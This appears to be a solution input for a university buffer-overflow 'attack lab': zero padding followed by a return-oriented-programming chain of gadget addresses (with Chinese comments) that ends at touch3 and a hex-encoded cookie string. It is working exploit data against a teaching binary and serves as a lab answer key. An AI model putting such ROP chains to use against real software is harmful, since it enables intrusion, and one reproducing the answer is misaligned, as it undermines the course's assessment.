00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

ad 1a 40 00 00 00 00 00 /* gadget2 */
a2 19 40 00 00 00 00 00 /* gadget4 */
cc 19 40 00 00 00 00 00 /* gadget3 */
48 00 00 00 00 00 00 00 /* 8字节x的值->50 */
dd 19 40 00 00 00 00 00 /* gadget5 */
34 1a 40 00 00 00 00 00 /* gadget8 */
27 1a 40 00 00 00 00 00 /* gadget7 */
d6 19 40 00 00 00 00 00 /* add_xy */
a2 19 40 00 00 00 00 00 /* gadget4 */
fa 18 40 00 00 00 00 00 /* touch3 */

35 39 62 39 39 37 66 61 
00 00 00 00 00 00 00 00 /* cookie字符串 */